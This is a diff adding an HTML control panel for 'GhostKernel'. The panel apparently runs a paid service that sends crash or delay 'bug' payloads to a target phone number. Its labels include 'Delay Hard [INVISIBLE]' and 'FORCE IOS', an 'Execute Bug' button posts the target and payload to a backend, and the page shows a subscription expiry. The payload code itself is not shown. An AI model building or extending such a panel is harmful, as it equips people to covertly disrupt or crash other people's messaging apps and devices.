@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Dashboard - GhostKernel</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h2>GhostKernel Dashboard</h2>
+        <p>Status: <span id="status">Connected</span></p>
+        <h3>Target Number:</h3>
+        <input type="text" id="target" placeholder="+62xxxxxxxxxx">
+        <h3>Select Payload:</h3>
+        <select id="payload">
+            <option value="blank">BLANK CHAT [VISIBLE]</option>
+            <option value="medium">Delay Medium [INVISIBLE]</option>
+            <option value="hard">Delay Hard [INVISIBLE]</option>
+            <option value="ios">FORCE IOS [INVISIBLE]</option>
+        </select>
+        <br><br>
+        <button onclick="executeBug()">Execute Bug</button>
+        <p id="result"></p>
+        <p>Expired: <span id="expired"></span></p>
+    </div>
+    <script>
+        async function executeBug() {
+            const target = document.getElementById('target').value;
+            const payload = document.getElementById('payload').value;
+            const res = await fetch('/api/bug', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({target, payload})
+            });
+            const data = await res.json();
+            document.getElementById('result').innerText = data.message;
+        }
+
+        // Cek expired
+        (async () => {
+            const res = await fetch('/api/check-expired');
+            const data = await res.json();
+            document.getElementById('expired').innerText = data.expired;
+        })();
+    </script>
+</body>
+</html>
